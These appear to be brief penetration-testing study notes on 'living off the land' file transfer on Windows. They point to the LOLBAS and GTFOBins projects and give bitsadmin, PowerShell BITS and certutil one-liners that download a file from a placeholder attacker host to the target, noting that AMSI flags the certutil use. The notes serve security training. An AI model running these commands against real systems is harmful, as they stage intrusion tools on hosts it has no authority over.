# LOLBAS and GTFOBins
- can show you what files you can use for uploads and downloads and give you the steps
## LOLBAS
![[../assets/Living off the Land/image 185.png|image 185.png]]
  
  
## GTFOBins
![[../assets/Living off the Land/image 1 138.png|image 1 138.png]]
  
  
# Other Common Living off the Land Tools
## Bitsadmin Download Function
- BITS (Background Intelligent Transfer Service) can be used to download files from HTTP sites and SMB shares
    
    - minimized impact on user’s foreground work
    
  
### Download with Bitsadmin
```Markdown
bitsadmin /transfer wcb /priority foreground http://<IP>:<port>/<file> C:\<outfile>
```
- PowerShell also enables interaction with BITS
```Markdown
Import-Module bitstransfer; Start-BitsTransfer -Source "http://<IP>:<port>/<file>" -Destination "C:\<outfile>"
```
  
  
## Certutil
- available in all Windows versions
    
    - serves as the defacto wget for Windows
    
- Antimalware Scan Interface (AMSI) will show this as malicious usage
```Markdown
certutil.exe -verifyctl -split -f http://<IP>:<port>/<file>
```